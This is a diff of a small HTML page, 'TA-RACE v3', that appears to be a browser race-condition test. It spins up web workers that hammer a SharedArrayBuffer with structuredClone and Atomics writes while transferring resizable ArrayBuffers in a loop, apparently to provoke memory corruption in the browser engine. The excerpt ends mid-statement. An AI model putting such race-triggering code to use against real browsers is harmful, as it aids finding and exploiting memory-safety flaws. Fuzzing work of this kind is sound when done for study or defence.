@@ -1,97 +1,49 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v2</title>
+<title>TA-RACE v3</title>
 <body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v2]</div>
+<div id=o>[TA-RACE v3]</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>{o.textContent+="\n"+m;};
+const tick=()=>new Promise(r=>setTimeout(r,0));
 window.addEventListener('error',e=>log("[ERROR] "+e.message+" @ "+(e.lineno||"?")));
 log("[*] UA: "+navigator.userAgent);
+log("[*] SAB: "+(typeof SharedArrayBuffer!=="undefined"?"AVAILABLE":"BLOCKED - need COOP/COEP headers"));
 
-const WK = `
-let u8=null, mem=null;
-onmessage = e => {
-  if (e.data.sab) {
-    u8 = new Uint8Array(e.data.sab);
+const WK=`let u8=null;
+onmessage=async e=>{
+  if(e.data.sab){
+    u8=new Uint8Array(e.data.sab);
+    log2("worker "+e.data.who+" on SAB");
     let i=0;
-    while (true) {
-      try { structuredClone(u8.subarray(0,256)); } catch(_) {}
-      Atomics.store(u8, (i>>>0) & 0xFFFF, i & 0xFF);
-      i++;
-      if ((i & 0xFFFFF)===0) postMessage({tick:i, who:e.data.who});
+    while(true){
+      try{structuredClone(u8.subarray(0,256));}catch(_){}
+      Atomics.store(u8,(i>>>0)&0xFFFF,i&0xFF);
+      if((++i&0xFFF)===0) await new Promise(r=>setTimeout(r,0));
     }
   }
-  if (e.data.mem) {
-    mem = e.data.mem;
-    let i=0;
-    while (true) {
-      try { mem.grow(1); } catch(_) {}
-      try { structuredClone(new Uint8Array(mem.buffer).subarray(0,128)); } catch(_) {}
-      i++;
-      if ((i & 0x1FFFFF)===0) postMessage({grow:i, who:e.data.who});
-    }
-  }
-};`;
+};
+function log2(m){postMessage({log:m});}`;
 
-log("[1] workers defined");
-let wA, wB;
-try {
-  wA = new Worker(URL.createObjectURL(new Blob([WK])));
-  log("[2] worker A created");
-  wB = new Worker(URL.createObjectURL(new Blob([WK])));
-  log("[3] worker B created");
-} catch(e){ log("[FAIL] worker create: "+e.name+" "+e.message); throw e; }
+const wA=new Worker(URL.createObjectURL(new Blob([WK])));
+const wB=new Worker(URL.createObjectURL(new Blob([WK])));
+const wR=new Worker(URL.createObjectURL(new Blob([`
+onmessage=e=>{ for(const ab of e.data.abs){ try{new Uint8Array(ab)[0]=0x41;}catch(_){} try{postMessage({abs:[ab]},[ab]);}catch(_){} } };
+`])));
+log("[1] 3 workers up");
+wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
+wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
 
-const WK2 = `
-onmessage = e => {
-  for (const ab of e.data.abs) {
-    try { new Uint8Array(ab)[0] = 0x41; } catch(_) {}
-    try { postMessage({ab:[ab]}, [ab]); } catch(_) {}
-  }
-};`;
-let wR;
-try {
-  wR = new Worker(URL.createObjectURL(new Blob([WK2])));
-  log("[4] ring worker created");
-} catch(e){ log("[FAIL] ring worker: "+e.name+" "+e.message); throw e; }
+let sab=null, mu8=null;
+try{
+  sab=new SharedArrayBuffer(0x10000);
+  mu8=new Uint8Array(sab);
+  wA.postMessage({sab,who:'A'});
+  wB.postMessage({sab,who:'B'});
+  log("[2] SAB shared -> workers");
+}catch(e){log("[FAIL] SAB: "+e.name);}
 
-let sab;
-try {
-  sab = new SharedArrayBuffer(0x10000);
-  log("[5] SAB created");
-  wA.postMessage({sab, who:'A'});
-  log("[6] SAB -> A");
-  wB.postMessage({sab, who:'B'});
-  log("[7] SAB -> B");
-} catch(e){ log("[FAIL] SAB: "+e.name+" "+e.message); }
-
-try {
-  const m = new WebAssembly.Memory({initial:1, maximum:64, shared:true});
-  log("[8] shared WASM mem created");
-  wA.postMessage({mem:m, who:'A'});
-  wB.postMessage({mem:m, who:'B'});
-  log("[9] WASM mem shared");
-} catch(e){ log("[-] shared WASM blocked: "+e.name); }
-
-const ring=[];
-wR.onmessage = e => { try { ring.push(...e.data.ab); } catch(_){} };
-log("[10] ring handler set");
-
-const mu8 = new Uint8Array(sab);
-let it=0;
-log("[*] entering main loop");
-while (true) {
-  const ab = new ArrayBuffer(256, {maxByteLength: 65536});
-  try { ab.resize(4096); } catch(_) {}
-  if (ring.length < 64) {
-    try { wR.postMessage({abs:[ab]}, [ab]); } catch(_) {}
-  } else {
-    const back = ring.pop();
-    try { wR.postMessage({abs:[back]}, [back]); } catch(_) {}
-  }
-  try { structuredClone(mu8.subarray(0,256)); } catch(_) {}
-  it++;
-  if ((it & 0x1FFFF)===0) log("[*] it="+it+" ring="+ring.length);
-}
-</script>
+let inFlight=0;
+wR.onmessage=e=>{
+  for
